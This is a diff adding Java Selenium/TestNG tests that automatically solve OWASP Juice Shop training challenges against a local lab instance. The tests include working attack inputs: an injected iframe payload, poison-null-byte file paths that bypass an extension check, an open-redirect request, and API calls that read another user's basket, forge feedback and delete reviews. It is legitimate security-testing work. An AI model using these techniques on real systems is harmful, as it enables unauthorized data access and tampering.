@@ -1,5 +1,7 @@
 package tests.JuiceShop;
 
+import utilities.JuiceShop.JuiceShopApi;
+
 import pom.JuiceShop.LoginPage;
 import pom.JuiceShop.SearchPage;
 
@@ -286,7 +288,305 @@ public class JuiceShopChallengesTest extends JuiceShopBaseTest
         assertChallengeSolved("Misplaced IaC Files");
     }
 
+    @Test(priority = 17)
+    public void testBonusPayloadChallenge() {
+        var driver = ZapManager.getDriver();
+        driver.get(baseUrl);
 
+        SearchPage searchPage = new SearchPage(driver);
+        searchPage.dismissInitialOverlays();
+
+        String payload = "<iframe width=\"100%\" height=\"166\" scrolling=\"no\" frameborder=\"no\" allow=\"autoplay\" "
+                + "src=\"https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076"
+                + "&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true"
+                + "&show_reposts=false&show_teaser=true\"></iframe>";
+
+        searchPage.search(payload);
+
+        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(15));
+        wait.until(ExpectedConditions.visibilityOfElementLocated(By.cssSelector("iframe[src*='soundcloud.com/player']")));
+
+        ScreenshotHelper.capture(driver);
+        assertChallengeSolved("Bonus Payload");
+    }
+
+    @Test(priority = 18)
+    public void testEasterEggChallenge() throws Exception {
+        var driver = ZapManager.getDriver();
+
+        // Discover the Easter Egg through the publicly exposed FTP directory.
+        driver.get(baseUrl + "/ftp/");
+
+        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(15));
+        wait.until(ExpectedConditions.presenceOfElementLocated(By.cssSelector("a[href*='eastere.gg']")));
+
+        // Use the extension-validation weakness in this local Juice Shop lab.
+        String path = "/ftp/eastere.gg%2500.md";
+        HttpResponse<String> response = sendGet(path);
+
+        System.out.println("[EASTER EGG] HTTP status: " + response.statusCode());
+
+        Assert.assertEquals(response.statusCode(), 200,
+                "Easter Egg file was not accessible. Response: " + response.body());
+
+        Assert.assertTrue(response.body().toLowerCase().contains("easter egg"),
+                "The server returned HTTP 200, but the expected Easter Egg content was missing.");
+
+        ScreenshotHelper.captureResponse(driver, response);
+        assertChallengeSolved("Easter Egg");
+    }
+
+    @Test(priority = 19)
+    public void testPoisonNullByteChallenge() throws Exception {
+        String fileName = "package.json.bak%2500.md";
+        String path = "/ftp/";
+
+        var driver = ZapManager.getDriver();
+        driver.get(baseUrl + path);
+
+        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(15));
+        wait.until(ExpectedConditions.presenceOfElementLocated(By.cssSelector("a[href*='package.json.bak']")));
+
+        HttpResponse<String> response = sendGet(path + fileName);
+
+        System.out.println("[POISON NULL BYTE] HTTP status: " + response.statusCode());
+        System.out.println("[POISON NULL BYTE] Content type: " + response.headers().firstValue("content-type").orElse("unknown"));
+        System.out.println("[POISON NULL BYTE] Response length: " + response.body().length());
+
+        Assert.assertEquals(response.statusCode(), 200, "Developer backup request did not return HTTP 200.");
+
+        // Save the response and preserve the result screen for SlowMo presentations.
+        ScreenshotHelper.captureResponse(driver, response);
+
+        // Verify actual challenge completion rather than assuming a particular body format.
+        assertChallengeSolved("Forgotten Developer Backup");
+        assertChallengeSolved("Poison Null Byte");
+    }
+    @Test(priority = 20)
+    public void testForgottenSalesBackupChallenge() throws Exception {
+        var driver = ZapManager.getDriver();
+        String path = "/ftp/coupons_2013.md.bak%2500.pdf";
+
+        HttpResponse<String> response = sendGet(path);
+        System.out.println("[SALES BACKUP] HTTP status: " + response.statusCode());
+
+        Assert.assertEquals(response.statusCode(), 200, "Sales backup was not accessible.");
+
+        ScreenshotHelper.captureResponse(driver, response);
+        assertChallengeSolved("Forgotten Sales Backup");
+    }
+
+    @Test(priority = 21)
+    public void testMisplacedSignatureFileChallenge() throws Exception {
+        var driver = ZapManager.getDriver();
+        String path = "/ftp/suspicious_errors.yml%2500.md";
+
+        HttpResponse<String> response = sendGet(path);
+        System.out.println("[SIEM SIGNATURE] HTTP status: " + response.statusCode());
+
+        Assert.assertEquals(response.statusCode(), 200, "SIEM signature file was not accessible.");
+
+        ScreenshotHelper.captureResponse(driver, response);
+        assertChallengeSolved("Misplaced Signature File");
+    }
+
+    @Test(priority = 22)
+    public void testOutdatedAllowlistChallenge() throws Exception {
+        var driver = ZapManager.getDriver();
+        String destination = "https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm";
+        String path = "/redirect?to=" + destination;
+
+        HttpResponse<String> response = sendGet(path);
+        String location = response.headers().firstValue("location").orElse("");
+
+        System.out.println("[OUTDATED ALLOWLIST] HTTP status: " + response.statusCode());
+        System.out.println("[OUTDATED ALLOWLIST] Redirect target: " + location);
+
+        Assert.assertEquals(response.statusCode(), 302, "Expected a redirect response.");
+        Assert.assertEquals(location, destination, "Unexpected redirect destination.");
+
+        ScreenshotHelper.captureResponse(driver, response);
+        assertChallengeSolved("Outdated Allowlist");
+    }
+
+
+    @Test(priority = 23)
+    public void testPrivacyPolicyInspectionChallenge() throws Exception {
+        var driver = ZapManager.getDriver();
+        String challengePath = "/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility";
+        String imagePath = "/assets/private/thank-you.jpg";
+
+        driver.get(baseUrl + challengePath);
+        assertChallengeSolved("Privacy Policy Inspection");
+
+        boolean imageAvailable = false;
+
+        try {
+            HttpResponse<String> response = sendGet(imagePath);
+            String contentType = response.headers().firstValue("Content-Type").orElse("");
+
+            if (response.statusCode() == 200 && contentType.toLowerCase().startsWith("image/")) {
+                driver.get(baseUrl + imagePath);
+
+                imageAvailable = new WebDriverWait(driver, Duration.ofSeconds(5)).until(d ->
+                        d.findElements(By.tagName("img")).stream().anyMatch(img -> {
+                            String width = img.getDomProperty("naturalWidth");
+                            return width != null && Integer.parseInt(width) > 0;
+                        })
+                );
+            }
+        } catch (Exception e) {
+            System.out.println("[PRIVACY POLICY] Image unavailable: " + e.getMessage());
+        }
+
+        if (!imageAvailable) {
+            System.out.println("[PRIVACY POLICY] Opening the application's Privacy Policy page.");
+            driver.get(baseUrl + "#/privacy-security/privacy-policy");
+
+            new WebDriverWait(driver, Duration.ofSeconds(15)).until(
+                    ExpectedConditions.visibilityOfElementLocated(By.cssSelector("app-privacy-policy"))
+            );
+        }
+
+        ScreenshotHelper.capture(driver);
+    }
+
+    @Test(priority = 24)
+    public void testRepetitiveRegistrationChallenge() throws Exception {
+        var driver = ZapManager.getDriver();
+        JuiceShopApi api = new JuiceShopApi(baseUrl);
+        String email = "registration-" + System.nanoTime() + "@example.com";
+
+        Map<String, Object> payload = Map.of(
+                "email", email,
+                "password", "Password123!",
+                "passwordRepeat", "Different123!"
+        );
+
+        HttpResponse<String> response = api.post("/api/Users/", payload);
+        System.out.println("[REPETITIVE REGISTRATION] HTTP status: " + response.statusCode());
+
+        ScreenshotHelper.captureResponse(driver, response);
+        assertChallengeSolved("Repetitive Registration");
+    }
+
+    @Test(priority = 25)
+    public void testEmptyUserRegistrationChallenge() throws Exception {
+        var driver = ZapManager.getDriver();
+        JuiceShopApi api = new JuiceShopApi(baseUrl);
+
+        Map<String, Object> payload = Map.of(
+                "email", "",
+                "password", "",
+                "passwordRepeat", ""
+        );
+
+        HttpResponse<String> response = api.post("/api/Users/", payload);
+        System.out.println("[EMPTY REGISTRATION] HTTP status: " + response.statusCode());
+
+        ScreenshotHelper.captureResponse(driver, response);
+        assertChallengeSolved("Empty User Registration");
+    }
+
+    @Test(priority = 26)
+    public void testViewBasketChallenge() throws Exception {
+        var driver = ZapManager.getDriver();
+        JuiceShopApi api = new JuiceShopApi(baseUrl);
+        var session = api.login();
+
+        int targetBasket = session.basketId() == 1 ? 2 : 1;
+        HttpResponse<String> response = api.get("/rest/basket/" + targetBasket, session.token());
+
+        System.out.println("[VIEW BASKET] Authenticated basket: " + session.basketId());
+        System.out.println("[VIEW BASKET] Requested basket: " + targetBasket);
+        System.out.println("[VIEW BASKET] HTTP status: " + response.statusCode());
+
+        Assert.assertNotEquals(targetBasket, session.basketId(), "Target basket belongs to the authenticated user.");
+        Assert.assertEquals(response.statusCode(), 200, "Another user's basket was not accessible.");
+
+        ScreenshotHelper.captureResponse(driver, response);
+        assertChallengeSolved("View Basket");
+    }
+
+    @Test(priority = 27)
+    @SuppressWarnings("unchecked")
+    public void testForgedFeedbackChallenge() throws Exception {
+        var driver = ZapManager.getDriver();
+        JuiceShopApi api = new JuiceShopApi(baseUrl);
+        var session = api.login();
+
+        HttpResponse<String> captchaResponse = api.get("/rest/captcha/");
+        Assert.assertEquals(captchaResponse.statusCode(), 200, "CAPTCHA request failed.");
+
+        Map<String, Object> captcha = new Json().toType(captchaResponse.body(), Map.class);
+        int captchaId = ((Number) captcha.get("captchaId")).intValue();
+        String answer = captcha.get("answer").toString();
+        int forgedUserId = session.userId() == 1 ? 2 : 1;
+
+        Map<String, Object> payload = Map.of(
+                "UserId", forgedUserId,
+                "comment", "Automated authorization test",
+                "rating", 1,
+                "captchaId", captchaId,
+                "captcha", answer
+        );
+
+        HttpResponse<String> response = api.post("/api/Feedbacks/", payload, session.token());
+
+        System.out.println("[FORGED FEEDBACK] Authenticated user: " + session.userId());
+        System.out.println("[FORGED FEEDBACK] Submitted as user: " + forgedUserId);
+        System.out.println("[FORGED FEEDBACK] HTTP status: " + response.statusCode());
+
+        Assert.assertNotEquals(forgedUserId, session.userId(), "Feedback must reference another user.");
+        Assert.assertEquals(response.statusCode(), 201, "Forged feedback was not accepted.");
+
+        ScreenshotHelper.captureResponse(driver, response);
+        assertChallengeSolved("Forged Feedback");
+    }
+
+    @Test(priority = 28)
+    public void testFiveStarFeedbackChallenge() throws Exception {
+        var driver = ZapManager.getDriver();
+        JuiceShopApi api = new JuiceShopApi(baseUrl);
+        var session = api.login();
+
+        HttpResponse<String> initial = api.get("/api/Feedbacks/", session.token());
+        Assert.assertEquals(initial.statusCode(), 200, "Could not retrieve customer feedback.");
+
+        List<Map<String, Object>> feedbacks = api.getFeedbackRecords(initial.body());
+        int removed = 0;
+
+        for (Map<String, Object> feedback : feedbacks) {
+            int rating = ((Number) feedback.get("rating")).intValue();
+            if (rating != 5) continue;
+
+            int id = ((Number) feedback.get("id")).intValue();
+            HttpResponse<String> deletion = api.delete("/api/Feedbacks/" + id, session.token());
+
+            Assert.assertTrue(deletion.statusCode() == 200 || deletion.statusCode() == 204,
+                    "Failed to delete feedback ID " + id + ". HTTP " + deletion.statusCode());
+
+            removed++;
+            System.out.println("[FIVE-STAR FEEDBACK] Deleted feedback ID: " + id);
+        }
+
+        HttpResponse<String> remaining = api.get("/api/Feedbacks/", session.token());
+        Assert.assertEquals(remaining.statusCode(), 200, "Could not verify remaining feedback.");
+
+        boolean fiveStarsRemain = api.getFeedbackRecords(remaining.body()).stream()
+                .anyMatch(feedback -> ((Number) feedback.get("rating")).intValue() == 5);
+
+        Assert.assertFalse(fiveStarsRemain, "Five-star customer feedback still exists.");
+        System.out.println("[FIVE-STAR FEEDBACK] Entries removed: " + removed);
+
+        ScreenshotHelper.captureResponse(driver, remaining);
+        assertChallengeSolved("Five-Star Feedback");
+    }
+
+
+    /**********************************************************************************************************************/
+    // This test not only completes the challenge but serves the purpose of verifying the # of challenges that have been
+    // completed by the test suite. For this reason, it's priority is marked as 1000 so it's the last test ran.
 
     @Test(priority = 1000)
     public void testScoreBoardChallenge() {
